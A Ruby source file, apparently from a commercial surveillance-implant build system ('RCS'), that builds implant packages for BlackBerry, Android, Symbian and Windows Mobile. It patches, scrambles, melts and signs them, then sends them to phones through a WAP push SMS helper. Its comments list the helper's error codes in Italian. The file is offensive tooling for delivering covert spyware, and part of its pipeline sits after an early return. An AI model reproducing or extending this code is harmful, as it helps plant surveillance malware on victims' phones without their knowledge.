#
# Wap PUSH messages
#

require_relative '../frontend'

# from RCS::Common
require 'rcs-common/trace'

module RCS
module DB

class BuildWap < Build

  def initialize
    super
    @platform = 'wap'
  end

  def load(params)
    trace :debug, "Build: load: #{params}"

    params['platform'] = @platform
    super
  end

  def generate(params)
    trace :debug, "Build: generate: #{params}"

    return

    # force demo if the RMI is in demo
    params['binary']['demo'] = true if LicenseManager.instance.limits[:rmi][1]

    params['platforms'].each do |platform|
      build = Build.factory(platform.to_sym)

      build.load({'_id' => @factory._id})
      build.unpack
      begin
        build.patch params['binary'].dup
      rescue NoLicenseError => e
        trace :warn, "Build: generate: #{e.message}"
        build.clean
        next
      end
      build.scramble
      build.melt params['melt'].dup
      build.sign params['sign'].dup

      outs = build.outputs

      # purge the unneeded files
      case platform
        when 'blackberry'
          outs.keep_if {|o| o['.cod'] or o['.jad'] }
          outs.delete_if {|o| o['res']}
        when 'android'
          outs.keep_if {|o| o['.apk']}
        when 'symbian'
          outs.keep_if {|o| o['.sisx']}
          outs.delete_if {|o| o['5th'] or o['3rd']}
        when 'winmo'
          outs.keep_if {|o| o['.cab']}
      end
      
      # copy the outputs in our directory
      outs.each do |o|
        FileUtils.cp(File.join(build.tmpdir, o), path(o))
        @outputs << o
      end

      build.clean
    end

  end

  def deliver(params)
    trace :debug, "Build: deliver: #{params}"

    #@outputs.each do |o|
    #  content = File.open(path(o), 'rb') {|f| f.read}
    #  Frontend.collector_put(o, content)
    #end

    # TODO: send the sms
    begin
      CrossPlatform.exec path('wps')
    rescue Exception => e
=begin
      1: errore modem (il modem non supporta le funzioni specificate) o network (il messaggio non viene consegnato)
      2: errore nel formato del messaggio dopo l'encoding (link + testo + encoding > 140 caratteri)
      3: errore sugli argomenti (l'autodiscovery ha fallito miseramente, numero di telefono malformato etc...)
      4: errore sulla commandline (parametri obbligatori mancanti o combinazioni di flag insensate etc...)
=end

      trace :error, e.message
    end

  end

end

end #DB::
end #RCS::
